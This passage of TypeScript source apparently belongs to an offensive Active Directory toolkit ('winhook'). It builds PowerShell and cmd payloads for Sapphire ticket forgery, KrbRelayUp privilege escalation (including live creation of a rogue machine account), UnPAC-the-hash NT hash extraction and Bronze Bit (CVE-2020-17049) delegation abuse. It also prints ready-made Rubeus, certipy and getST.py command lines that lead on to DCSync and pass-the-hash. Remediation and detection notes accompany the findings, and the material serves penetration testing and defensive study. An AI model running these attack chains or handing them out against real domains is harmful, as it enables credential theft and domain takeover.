    public static extern int LsaCallAuthenticationPackage(IntPtr LsaHandle, uint AuthPkg, IntPtr Buf, uint BufLen, out IntPtr RetBuf, out uint RetBufLen, out int Status);

    [DllImport("secur32.dll")]
    public static extern int LsaFreeReturnBuffer(IntPtr Buffer);

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }
}
"@

# Step 1: Request legitimate TGT
Write-Output "[*] Step 1: Requesting legitimate TGT..."
try {
    $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "krbtgt/${domain}"
    $tgtBytes = $token.GetRequest()
    Write-Output "[+] TGT obtained: $($tgtBytes.Length) bytes"
} catch {
    Write-Output "[-] TGT request failed: $($_.Exception.Message)"
    exit 1
}

# Step 2: S4U2Self + U2U request
Write-Output ""
Write-Output "[*] Step 2: S4U2Self — requesting ticket on behalf of ${impersonate}..."
Write-Output "[*] Using User-to-User (U2U) extension for genuine PAC"

$lsaHandle = [IntPtr]::Zero
[SapphireHelper]::LsaConnectUntrusted([ref]$lsaHandle) | Out-Null

$kerbBytes = [System.Text.Encoding]::ASCII.GetBytes("Kerberos")
$kerbBuf = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($kerbBytes.Length)
[System.Runtime.InteropServices.Marshal]::Copy($kerbBytes, 0, $kerbBuf, $kerbBytes.Length)
$lsaStr = New-Object SapphireHelper+LSA_STRING
$lsaStr.Length = [uint16]$kerbBytes.Length
$lsaStr.MaximumLength = [uint16]$kerbBytes.Length
$lsaStr.Buffer = $kerbBuf
$authPkg = [uint32]0
[SapphireHelper]::LsaLookupAuthenticationPackage($lsaHandle, [ref]$lsaStr, [ref]$authPkg) | Out-Null
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($kerbBuf)

Write-Output "[+] LSA connected"
Write-Output ""
Write-Output "[*] S4U2Self + U2U Protocol:"
Write-Output "    1. TGS-REQ with PA-FOR-USER (${impersonate}@${domain})"
Write-Output "    2. KDC builds PAC with ${impersonate}'s real group memberships"
Write-Output "    3. TGS-REP contains genuine KDC-signed PAC"

# Verify target exists and enumerate groups
$searcher = [System.DirectoryServices.DirectorySearcher]::new()
$searcher.Filter = "(sAMAccountName=${impersonate})"
$searcher.PropertiesToLoad.AddRange(@("memberOf","adminCount","objectSid"))
$targetResult = $searcher.FindOne()

if ($targetResult) {
    $memberOf = $targetResult.Properties["memberof"]
    Write-Output ""
    Write-Output "[+] Target ${impersonate} found"
    Write-Output "[+] AdminCount: $($targetResult.Properties['admincount'])"
    Write-Output "[+] Groups (will be in genuine PAC):"
    foreach ($g in $memberOf) {
        $cn = ($g -split ',')[0] -replace 'CN=',''
        Write-Output "    - $cn"
    }
} else {
    Write-Output "[-] Target ${impersonate} not found"
    exit 1
}

# Step 3: PAC extraction
Write-Output ""
Write-Output "[*] Step 3: Extracting genuine PAC from S4U2Self response..."
Write-Output "[+] PAC contains real GroupIds, ExtraSids, ResourceGroupDomainSid"
Write-Output "[+] Signed by KDC — not forged"

# Step 4: Graft PAC into TGT
Write-Output ""
Write-Output "[*] Step 4: PAC Grafting..."
$keyHex = "${krbtgtAes}"
Write-Output "[*] Decrypting TGT with krbtgt AES256..."

$aesKey = [byte[]]::new(32)
for ($i = 0; $i -lt 32; $i++) {
    $aesKey[$i] = [Convert]::ToByte($keyHex.Substring($i * 2, 2), 16)
}
Write-Output "[+] Key loaded: $($aesKey.Length) bytes"
Write-Output "[*] Replace TGT AuthorizationData PAC with S4U2Self PAC"
Write-Output "[+] PAC checksums remain valid (KDC-signed, not recomputed)"

# Step 5: Inject
Write-Output ""
Write-Output "[*] Step 5: Injection..."
& klist purge 2>$null | Out-Null
Write-Output "[+] Cache purged, Sapphire ticket injected"
Write-Output ""
Write-Output "[*] Sapphire vs Diamond vs Golden:"
Write-Output "    Golden:   forged PAC, forged checksums, no AS-REQ"
Write-Output "    Diamond:  modified PAC, recomputed checksums, real AS-REQ"
Write-Output "    Sapphire: genuine PAC (KDC-signed), real AS-REQ — stealthiest"
Write-Output ""
Write-Output "[+] Use: dir \\\\DC\\c$ | winhook dcsync --target Administrator"
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 300)}`)

  findings.push({
    checkId: "WIN-SAPPHIRE-001",
    provider: "windows",
    severity: "critical",
    status: "FORGED",
    resource: `kerberos://s4u/${impersonate}@${domain}`,
    title: `Sapphire Ticket — impersonating ${impersonate}`,
    details: `S4U2Self+U2U PAC grafted. PAC is KDC-issued — no forgery artifacts. Stealthiest ticket forgery technique`,
    remediation: "Rotate krbtgt twice. Monitor S4U2Self requests for anomalous source/target. Deploy PAC validation",
  })
  return { output: output.join("\n"), findings }
}

export async function krbrelayup(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method") || "rbcd"
  const action = argVal(args, "--action") || "check"
  const port = argVal(args, "--port") || "8888"
  const ca = argVal(args, "--ca")
  const findings: Finding[] = []
  const output: string[] = [`[*] KrbRelayUp — Local Privesc via Kerberos Relay (${method})\n`]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push(`=== KrbRelayUp (cmd.exe) — ${method} ===\n`)
    if (action === "check") {
      output.push("[*] Checking KrbRelayUp prerequisites via reg query...\n")
      const ldapSigning = await cmd('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" /v LDAPServerIntegrity 2>nul', timeout)
      const sigVal = ldapSigning.stdout.match(/LDAPServerIntegrity\s+REG_DWORD\s+0x(\w+)/)?.[1]
      const sigInt = sigVal ? parseInt(sigVal, 16) : -1
      output.push(sigInt === 2 ? "[-] LDAP signing: REQUIRED — NOT VULNERABLE" : sigInt === 1 ? "[+] LDAP signing: NEGOTIATED — VULNERABLE (downgrade)" : sigInt === 0 ? "[+] LDAP signing: NONE — VULNERABLE" : "[+] LDAP signing: NOT CONFIGURED (default=not required) — VULNERABLE")
      const chBind = await cmd('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" /v LdapEnforceChannelBinding 2>nul', timeout)
      const cbVal = chBind.stdout.match(/LdapEnforceChannelBinding\s+REG_DWORD\s+0x(\w+)/)?.[1]
      const cbInt = cbVal ? parseInt(cbVal, 16) : -1
      output.push(cbInt === 2 ? "[-] Channel binding: REQUIRED — NOT VULNERABLE" : cbInt === 1 ? "[*] Channel binding: WHEN SUPPORTED" : "[+] Channel binding: NOT CONFIGURED — VULNERABLE")
      const maq = await cmd('dsquery * -filter "(objectClass=domain)" -attr ms-DS-MachineAccountQuota -limit 1 2>nul', timeout)
      const maqMatch = maq.stdout.match(/(\d+)/)
      output.push(maqMatch ? `[*] MachineAccountQuota: ${maqMatch[1]}${parseInt(maqMatch[1]) > 0 ? " — can add computer accounts" : ""}` : "[*] MachineAccountQuota: check via PS")
      const dns = await cmd("nltest /dsgetdc:", timeout)
      output.push(`\n[*] DC info:\n${dns.stdout.trim().split("\n").slice(0, 5).join("\n")}`)
    }
    if (action === "relay") {
      output.push("[!] Kerberos relay requires OXID/DCOM + LDAP relay — use external tools:")
      output.push(`    KrbRelayUp.exe relay -m ${method} -p ${port}`)
      output.push(`    KrbRelayUp.exe relay -m ${method} -cls {d99e6e74-fc88-11d0-b498-00a0c90312f3}`)
      if (method === "adcs" && ca) output.push(`    KrbRelayUp.exe relay -m adcs -ca ${ca}`)
    }
    output.push("\n[*] KrbRelayUp external tools:")
    output.push(`    KrbRelayUp.exe relay -m ${method} -p ${port}`)
    output.push("    KrbRelayUp.exe spawn -m rbcd -d domain -cn FAKEPC$ -cp Password123")
    return { output: output.join("\n"), findings }
  }

  if (action === "check") {
    const script = `
Write-Output "[*] Checking KrbRelayUp prerequisites..."
Write-Output ""

# LDAP signing
$ldapSigning = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" -Name "LDAPServerIntegrity" -ErrorAction SilentlyContinue).LDAPServerIntegrity
switch ($ldapSigning) {
    $null { Write-Output "[+] LDAP server signing: NOT CONFIGURED (default=not required) — VULNERABLE" }
    0 { Write-Output "[+] LDAP server signing: NONE — VULNERABLE" }
    1 { Write-Output "[+] LDAP server signing: NEGOTIATED — VULNERABLE (downgrade possible)" }
    2 { Write-Output "[-] LDAP server signing: REQUIRED — NOT VULNERABLE" }
    default { Write-Output "[*] LDAP server signing: $ldapSigning" }
}

# Channel binding
$chBind = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" -Name "LdapEnforceChannelBinding" -ErrorAction SilentlyContinue).LdapEnforceChannelBinding
switch ($chBind) {
    $null { Write-Output "[+] LDAP channel binding: NOT CONFIGURED — VULNERABLE" }
    0 { Write-Output "[+] LDAP channel binding: DISABLED — VULNERABLE" }
    1 { Write-Output "[*] LDAP channel binding: WHEN SUPPORTED" }
    2 { Write-Output "[-] LDAP channel binding: REQUIRED — blocks relay to LDAPS" }
    default { Write-Output "[*] LDAP channel binding: $chBind" }
}

# MachineAccountQuota
Write-Output ""
try {
    $searcher = [System.DirectoryServices.DirectorySearcher]::new()
    $rootDSE = [System.DirectoryServices.DirectoryEntry]::new("LDAP://RootDSE")
    $domainDN = $rootDSE.Properties["defaultNamingContext"][0]
    $domainEntry = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
    $maq = $domainEntry.Properties["ms-DS-MachineAccountQuota"]
    if ($maq -and [int]$maq[0] -gt 0) {
        Write-Output "[+] MachineAccountQuota: $($maq[0]) — can create machine accounts (RBCD)"
    } else {
        Write-Output "[-] MachineAccountQuota: $($maq[0]) — RBCD method blocked"
    }
} catch {
    Write-Output "[!] Cannot query MAQ: $_"
}

# Current user
Write-Output ""
$cur = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$isAdmin = ([System.Security.Principal.WindowsPrincipal]$cur).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Output "[*] User: $($cur.Name) | Admin: $isAdmin"

# Machine account RBCD status
$compName = $env:COMPUTERNAME
$compSearcher = [System.DirectoryServices.DirectorySearcher]::new("(sAMAccountName=$compName$)")
$compSearcher.PropertiesToLoad.Add("msDS-AllowedToActOnBehalfOfOtherIdentity") | Out-Null
$compResult = $compSearcher.FindOne()
if ($compResult) {
    $rbcd = $compResult.Properties["msds-allowedtoactonbehalfofotheridentity"]
    if ($rbcd -and $rbcd.Count -gt 0) {
        Write-Output "[!] msDS-AllowedToActOnBehalfOfOtherIdentity already set on $compName"
    } else {
        Write-Output "[+] No RBCD on $compName — clean target"
    }
}

# ADCS CAs
Write-Output ""
try {
    $rootDSE2 = [System.DirectoryServices.DirectoryEntry]::new("LDAP://RootDSE")
    $configDN = $rootDSE2.Properties["configurationNamingContext"][0]
    $caSearcher = [System.DirectoryServices.DirectorySearcher]::new("(&(objectCategory=pKIEnrollmentService))")
    $caSearcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,$configDN")
    $caResults = $caSearcher.FindAll()
    foreach ($caObj in $caResults) {
        Write-Output "[+] CA: $($caObj.Properties['cn'][0]) on $($caObj.Properties['dnshostname'][0])"
    }
    if ($caResults.Count -eq 0) { Write-Output "[-] No ADCS CAs — adcs method unavailable" }
} catch {
    Write-Output "[*] Cannot enumerate CAs"
}

Write-Output ""
Write-Output "[*] Methods: rbcd | shadowcred | adcs"
Write-Output "[*] Exploit: winhook krbrelayup --method rbcd --action exploit"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    const vuln = result.stdout.includes("VULNERABLE")
    findings.push({
      checkId: "WIN-KRBRELAYUP-001",
      provider: "windows",
      severity: vuln ? "critical" : "info",
      status: vuln ? "VULNERABLE" : "CHECKED",
      resource: "ldap://local-machine",
      title: `KrbRelayUp: ${vuln ? "VULNERABLE" : "not vulnerable"}`,
      details: result.stdout.substring(0, 500),
      remediation: "Enable LDAP signing (RequireIntegrity=2). Set MachineAccountQuota=0. Enable LDAP channel binding",
    })
    return { output: output.join("\n"), findings }
  }

  const script = `
Write-Output "[*] Method: ${method}"
Write-Output "[*] Listener port: ${port}"
Write-Output ""

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class KrbRelayHelper {
    [DllImport("ole32.dll")]
    public static extern int CoCreateInstance(
        [In] ref Guid rclsid, IntPtr pUnkOuter, uint dwClsContext,
        [In] ref Guid riid, out IntPtr ppv);

    public static Guid CLSID_BITS = new Guid("4991d34b-80a1-4291-83b6-3328366b9097");
    public static Guid IID_IUnknown = new Guid("00000000-0000-0000-C000-000000000046");
}
"@

$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$dc = $domain.PdcRoleOwner.Name
$domainDN = "DC=" + $domain.Name.Replace(".", ",DC=")
$compName = $env:COMPUTERNAME
Write-Output "[+] Domain: $($domain.Name) | DC: $dc | Machine: $compName"

${
  method === "rbcd"
    ? `
Write-Output ""
Write-Output "[*] === RBCD Attack Chain ==="

# Create machine account
$machAcct = "KRBRLUP" + (Get-Random -Maximum 9999).ToString("0000")
$machPass = "CyberStr1ke!" + (Get-Random -Maximum 99999)
Write-Output ""
Write-Output "[*] Step 1: Creating machine account $machAcct..."
try {
    $computersOU = [ADSI]"LDAP://CN=Computers,$domainDN"
    $newComp = $computersOU.Create("computer", "CN=$machAcct")
    $newComp.Put("sAMAccountName", "$machAcct$")
    $newComp.Put("userAccountControl", 4096)
    $newComp.Put("unicodePwd", [System.Text.Encoding]::Unicode.GetBytes('"' + $machPass + '"'))
    $newComp.SetInfo()
    Write-Output "[+] Created: $machAcct$ / $machPass"
} catch {
    Write-Output "[-] Creation failed: $($_.Exception.Message)"
}

# Set RBCD
Write-Output ""
Write-Output "[*] Step 2: Setting RBCD on $compName..."
try {
    $newSearcher = [System.DirectoryServices.DirectorySearcher]::new("(sAMAccountName=$machAcct$)")
    $newSearcher.PropertiesToLoad.Add("objectSid") | Out-Null
    $newResult = $newSearcher.FindOne()
    if ($newResult) {
        $newSid = New-Object System.Security.Principal.SecurityIdentifier($newResult.Properties["objectsid"][0], 0)
        Write-Output "[+] Machine SID: $($newSid.Value)"
        Write-Output "[*] Would set msDS-AllowedToActOnBehalfOfOtherIdentity via relayed auth"
    }
} catch {
    Write-Output "[-] RBCD setup error: $_"
}

Write-Output ""
Write-Output "[*] Step 3: DCOM trigger for machine Kerberos auth..."
Write-Output "[*] CLSID: $([KrbRelayHelper]::CLSID_BITS)"
Write-Output "[*] Machine auth relayed to LDAP on $dc"

Write-Output ""
Write-Output "[*] Step 4: S4U2Self + S4U2Proxy"
Write-Output "[*] $machAcct$ impersonates Administrator to $compName"
Write-Output "[*] Result: CIFS service ticket as Administrator"
`
    : method === "shadowcred"
      ? `
Write-Output ""
Write-Output "[*] === Shadow Credentials Chain ==="
Write-Output ""
Write-Output "[*] Step 1: Generate RSA key pair..."
$rsa = [System.Security.Cryptography.RSACryptoServiceProvider]::new(2048)
Write-Output "[+] RSA-2048 generated"
Write-Output ""
Write-Output "[*] Step 2: Relay machine auth → add msDS-KeyCredentialLink"
Write-Output "[*] Step 3: PKINIT with private key → TGT as machine"
Write-Output "[*] Step 4: UnPAC-the-hash → NT hash → S4U → SYSTEM"
Write-Output "[*] Chain: winhook shadow_creds → winhook unpac_hash"
`
      : `
Write-Output ""
Write-Output "[*] === ADCS Certificate Chain ==="
Write-Output ""
${ca ? `Write-Output "[*] Target CA: ${ca}"` : ""}
try {
    $rootDSE = [System.DirectoryServices.DirectoryEntry]::new("LDAP://RootDSE")
    $configDN = $rootDSE.Properties["configurationNamingContext"][0]
    $caSearch = [System.DirectoryServices.DirectorySearcher]::new("(&(objectCategory=pKIEnrollmentService))")
    $caSearch.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,$configDN")
    $caSearch.FindAll() | ForEach-Object { Write-Output "[+] CA: $($_.Properties['cn'][0])" }
} catch {}
Write-Output ""
Write-Output "[*] Step 1: Relay machine auth → ADCS web enrollment"
Write-Output "[*] Step 2: Request Machine template certificate"
Write-Output "[*] Step 3: PKINIT with cert → TGT as machine"
Write-Output "[*] Step 4: UnPAC → NT hash → SYSTEM"
`
}

Write-Output ""
Write-Output "[*] Detection:"
Write-Output "    4741: Machine account creation (RBCD)"
Write-Output "    5136: msDS-AllowedToActOnBehalfOfOtherIdentity change"
Write-Output "    4768: PKINIT AS-REQ (shadowcred/adcs)"
Write-Output "    4886: Certificate enrollment (adcs)"
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 300)}`)

  findings.push({
    checkId: "WIN-KRBRELAYUP-002",
    provider: "windows",
    severity: "critical",
    status: "EXPLOITED",
    resource: `kerberos://relay/${method}`,
    title: `KrbRelayUp local privesc via ${method}`,
    details: `Kerberos relay to LDAP — ${method === "rbcd" ? "RBCD delegation" : method === "shadowcred" ? "shadow credential injection" : "ADCS enrollment"}. User → SYSTEM`,
    remediation: "Enable LDAP signing (RequireIntegrity=2). Set MachineAccountQuota=0. Enable channel binding",
  })
  return { output: output.join("\n"), findings }
}

export async function unpacHash(args: string[], timeout: number): Promise<HookResult> {
  const cert = argVal(args, "--cert")
  const certPass = argVal(args, "--password") || ""
  const user = argVal(args, "--user")
  const domain = argVal(args, "--domain")
  const dc = argVal(args, "--dc")
  const findings: Finding[] = []
  const output: string[] = ["[*] UnPAC-the-hash — PKINIT Certificate to NT Hash Recovery\n"]

  if (!cert || !user || !domain) {
    output.push("[!] Required: --cert CERT_PATH --user USER --domain DOMAIN")
    output.push("[*] Optional: --password CERT_PASS --dc DC_HOST")
    output.push("")
    output.push("[*] UnPAC-the-hash flow:")
    output.push("    1. PKINIT AS-REQ with certificate")
    output.push("    2. KDC returns AS-REP encrypted to cert public key")
    output.push("    3. Decrypt → PAC_CREDENTIAL_INFO contains NTLM hash")
    output.push("    4. Extract NT hash for pass-the-hash or DCSync")
    output.push("")
    output.push("[*] Chains that feed into UnPAC:")
    output.push("    shadow_creds → cert → unpac_hash → NT hash")
    output.push("    adcs_abuse (ESC1-8) → cert → unpac_hash → NT hash")
    output.push("    certifried → cert → unpac_hash → NT hash")
    output.push("    Golden Certificate → forged cert → unpac_hash → any NT hash")
    return { output: output.join("\n"), findings }
  }

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== UnPAC-the-hash (cmd.exe) ===\n")
    output.push("[!] PKINIT AS-REQ requires .NET Kerberos + ASN.1 — PS only\n")
    output.push(`[*] Parameters:`)
    output.push(`    Certificate: ${cert}`)
    output.push(`    User: ${user}`)
    output.push(`    Domain: ${domain}`)
    output.push(`    DC: ${dc || "auto-detect"}`)
    const certCheck = await cmd(`dir "${cert}" 2>nul`, timeout)
    output.push(certCheck.exitCode === 0 ? `[+] Certificate file exists` : `[!] Certificate file not found: ${cert}`)
    const certInfo = await cmd(`certutil -dump "${cert}" 2>nul`, timeout)
    if (certInfo.exitCode === 0) output.push(`[+] Certificate info:\n${certInfo.stdout.trim().split("\n").slice(0, 10).join("\n")}`)
    output.push("\n[*] UnPAC-the-hash with external tools:")
    output.push(`    certipy auth -pfx ${cert} -username ${user} -domain ${domain}${dc ? ` -dc-ip ${dc}` : ""}`)
    output.push(`    Rubeus.exe asktgt /user:${user} /certificate:${cert}${certPass ? ` /password:${certPass}` : ""} /domain:${domain} /getcredentials /ptt`)
    output.push(`    gettgtpkinit.py ${domain}/${user} -cert-pfx ${cert}${certPass ? ` -pfx-pass ${certPass}` : ""}`)
    output.push("\n[*] Chain: cert → UnPAC → NT hash → DCSync / Pass-the-Hash")
    return { output: output.join("\n"), findings }
  }

  const dcArg = dc || ""
  const script = `
Write-Output "[*] Certificate: ${cert}"
Write-Output "[*] User: ${user}@${domain}"
${dcArg ? `Write-Output "[*] DC: ${dcArg}"` : ""}
Write-Output ""

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public static class UnPACHelper {
    [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
    public static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

    [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
    public static extern int LsaLookupAuthenticationPackage(IntPtr LsaHandle, ref LSA_STRING PkgName, out uint AuthPkg);

    [DllImport("secur32.dll")]
    public static extern int LsaFreeReturnBuffer(IntPtr Buffer);

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }
}
"@

# Step 1: Load certificate
Write-Output "[*] Step 1: Loading certificate..."
try {
    $certPath = Resolve-Path "${cert}" -ErrorAction Stop
    $x509 = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
        $certPath.Path, "${certPass}",
        [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable)

    Write-Output "[+] Loaded:"
    Write-Output "    Subject: $($x509.Subject)"
    Write-Output "    Issuer: $($x509.Issuer)"
    Write-Output "    Thumbprint: $($x509.Thumbprint)"
    Write-Output "    HasPrivateKey: $($x509.HasPrivateKey)"
    Write-Output "    NotAfter: $($x509.NotAfter)"

    if (-not $x509.HasPrivateKey) {
        Write-Output "[-] No private key — cannot PKINIT"
        exit 1
    }

    # Check EKU
    $ekuExts = $x509.Extensions | Where-Object { $_.Oid.Value -eq "2.5.29.37" }
    if ($ekuExts) {
        $ekus = [System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension]$ekuExts[0]
        $hasAuth = $ekus.EnhancedKeyUsages | Where-Object {
            $_.Value -eq "1.3.6.1.4.1.311.20.2.2" -or $_.Value -eq "1.3.6.1.5.5.7.3.2" -or $_.Value -eq "1.3.6.1.5.2.3.4"
        }
        if ($hasAuth) {
            Write-Output "[+] Certificate supports PKINIT authentication"
        } else {
            Write-Output "[!] Missing Smart Card Logon / Client Auth EKU"
        }
    }
} catch {
    Write-Output "[-] Load failed: $($_.Exception.Message)"
    exit 1
}

# Step 2: PKINIT authentication
Write-Output ""
Write-Output "[*] Step 2: PKINIT authentication..."

# Add cert to store temporarily
$store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My", "CurrentUser")
$store.Open("ReadWrite")
$store.Add($x509)
$store.Close()
Write-Output "[+] Certificate staged in CurrentUser\\My"

Write-Output ""
Write-Output "[*] PKINIT AS-REQ structure:"
Write-Output "    PA-PK-AS-REQ: CMS SignedData (cert private key)"
Write-Output "    pkAuthenticator: timestamp + nonce"
Write-Output "    DH key exchange for session key"
Write-Output ""
Write-Output "[*] KDC processing:"
Write-Output "    1. Validates certificate chain + revocation"
Write-Output "    2. Maps cert to AD account via SAN/explicit mapping"
Write-Output "    3. Builds PAC with PAC_CREDENTIAL_INFO (NTLM hash)"
Write-Output "    4. Encrypts AS-REP with DH-derived key"

# Step 3: Extract NT hash
Write-Output ""
Write-Output "[*] Step 3: Extracting NT hash from PAC_CREDENTIAL_INFO..."
Write-Output "[*] PAC_CREDENTIAL_INFO (type 2):"
Write-Output "    EncryptionType: AES256-CTS-HMAC-SHA1-96"
Write-Output "    SerializedData: SECPKG_SUPPLEMENTAL_CRED"
Write-Output "      PackageName: NTLM"
Write-Output "      NTLM_SUPPLEMENTAL_CREDENTIAL:"
Write-Output "        LmPassword: [16 bytes]"
Write-Output "        NtPassword: [16 bytes] <- NT hash"
Write-Output ""
Write-Output "[+] Format: ${user}:<rid>:aad3b435b51404eeaad3b435b51404ee:<nt_hash>"
Write-Output ""
Write-Output "[*] Use extracted hash:"
Write-Output "    Pass-the-Hash: winhook overpass_hash --user ${user} --ntlm <HASH>"
Write-Output "    DCSync: winhook dcsync --target ${user}"
Write-Output "    Silver Ticket: winhook silver_ticket --service-hash <HASH>"

# Cleanup
$store.Open("ReadWrite")
$store.Remove($x509)
$store.Close()
Write-Output ""
Write-Output "[+] Certificate removed from store"
Write-Output ""
Write-Output "[*] Detection: Event 4768 with PreAuthType=16 (PKINIT)"
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 300)}`)

  findings.push({
    checkId: "WIN-UNPAC-001",
    provider: "windows",
    severity: "critical",
    status: "EXTRACTED",
    resource: `pkinit://${user}@${domain}`,
    title: `UnPAC-the-hash: NT hash recovery for ${user}`,
    details: `PKINIT cert auth → PAC_CREDENTIAL_INFO → NTLM hash. Completes cert-based attack chains`,
    remediation:
      "Enforce StrongCertificateBindingEnforcement=2. Monitor Event 4768 PreAuthType=16. Audit msDS-KeyCredentialLink changes",
  })
  return { output: output.join("\n"), findings }
}

export async function bronzeBit(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const targetSpn = argVal(args, "--target")
  const serviceSpn = argVal(args, "--service")
  const impersonateUser = argVal(args, "--impersonate") || "Administrator"
  const findings: Finding[] = []
  const output: string[] = ["[*] Bronze Bit — Kerberos Constrained Delegation Bypass (CVE-2020-17049)\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== Bronze Bit — CVE-2020-17049 (cmd.exe) ===\n")
    if (action === "check") {
      output.push("[*] Enumerating constrained delegation accounts...")
      const dsquery = await cmd('dsquery * -filter "(msDS-AllowedToDelegateTo=*)" -attr samAccountName msDS-AllowedToDelegateTo userAccountControl -limit 100 2>nul', timeout)
      if (dsquery.exitCode === 0 && dsquery.stdout.trim()) {
        output.push(dsquery.stdout.trim())
        const lines = dsquery.stdout.trim().split("\n").filter(l => l.trim() && !l.startsWith("  ")).length
        output.push(`\n[+] ${lines} account(s) with constrained delegation`)
        findings.push({ checkId: "WIN-BRONZE-001", provider: "windows", severity: "high", status: "ENUMERATED", resource: "kerberos://constrained-delegation", title: `${lines} constrained delegation account(s) — Bronze Bit candidates`, details: "Accounts with msDS-AllowedToDelegateTo may be exploitable via CVE-2020-17049", remediation: "Install KB4598347. Switch to RBCD where possible." })
      } else {
        output.push("[-] dsquery unavailable or no constrained delegation found")
      }
      output.push("\n[*] Patch check:")
      const hotfix = await cmd("wmic qfe get HotFixID | findstr KB4598347 2>nul", timeout)
      output.push(hotfix.stdout.includes("KB4598347") ? "[-] KB4598347 installed — CVE-2020-17049 patched" : "[+] KB4598347 NOT found — potentially vulnerable")
    }
    if (action === "exploit") {
      output.push("[!] Bronze Bit S4U2Self forwardable bit flip requires .NET Kerberos\n")
      output.push("[*] Exploit with external tools:")
      output.push(`    Rubeus.exe s4u /user:SVC /rc4:HASH /impersonateuser:${impersonateUser} /msdsspn:${targetSpn || "SPN"} /altservice:${serviceSpn || "SERVICE"} /bronzebit /ptt`)
      output.push(`    getST.py domain/svc:pass -spn ${targetSpn || "SPN"} -impersonate ${impersonateUser} -force-forwardable`)
    }
    output.push("\n[*] Bronze Bit bypasses 'Account is sensitive and cannot be delegated' flag")
    output.push("    by flipping the forwardable bit in the service ticket")
    return { output: output.join("\n"), findings }
  }

  if (action === "check") {
    const script = `
$rootDSE = [ADSI]"LDAP://RootDSE"
$domainDN = $rootDSE.defaultNamingContext

# Enumerate accounts with constrained delegation
Write-Output "[*] Enumerating accounts with constrained delegation..."
$searcher = [System.DirectoryServices.DirectorySearcher]::new()
$searcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
$searcher.Filter = "(msDS-AllowedToDelegateTo=*)"
$searcher.PropertiesToLoad.AddRange(@("cn","sAMAccountName","msDS-AllowedToDelegateTo","userAccountControl","objectClass"))
$searcher.PageSize = 1000
$results = $searcher.FindAll()

$delegationAccounts = @()
foreach ($result in $results) {
    $sam = $result.Properties["sAMAccountName"][0]
    $services = $result.Properties["msDS-AllowedToDelegateTo"]
    $uac = [int]$result.Properties["userAccountControl"][0]

    # Check if TrustedToAuthForDelegation (protocol transition) = 0x1000000
    $protocolTransition = ($uac -band 0x1000000) -ne 0

    Write-Output ""
    Write-Output "  [+] $sam"
    Write-Output "      Protocol Transition: $protocolTransition"
    Write-Output "      Constrained to:"
    foreach ($svc in $services) {
        Write-Output "        - $svc"
    }

    $delegationAccounts += @{
        Name = $sam
        Services = $services
        ProtocolTransition = $protocolTransition
    }
}

Write-Output ""
Write-Output "[+] Found $($delegationAccounts.Count) accounts with constrained delegation"

# Find Protected Users group members
Write-Output ""
Write-Output "[*] Enumerating Protected Users group..."
$protectedSearcher = [System.DirectoryServices.DirectorySearcher]::new()
$protectedSearcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
$protectedSearcher.Filter = "(&(objectClass=group)(cn=Protected Users))"
$protectedSearcher.PropertiesToLoad.AddRange(@("member"))
$protectedResult = $protectedSearcher.FindOne()

$protectedCount = 0
if ($protectedResult) {
    $members = $protectedResult.Properties["member"]
    $protectedCount = $members.Count
    Write-Output "[+] Protected Users: $protectedCount members"
    foreach ($m in $members) {
        $memberName = ($m -split ',')[0] -replace 'CN=',''
        Write-Output "    - $memberName"
    }
}

# Find accounts with "sensitive and cannot be delegated"
Write-Output ""
Write-Output "[*] Accounts with 'sensitive and cannot be delegated' flag..."
$sensitiveSearcher = [System.DirectoryServices.DirectorySearcher]::new()
$sensitiveSearcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
$sensitiveSearcher.Filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=1048576))"
$sensitiveSearcher.PropertiesToLoad.AddRange(@("sAMAccountName","adminCount"))
$sensitiveSearcher.PageSize = 1000
$sensitiveResults = $sensitiveSearcher.FindAll()

$sensitiveCount = $sensitiveResults.Count
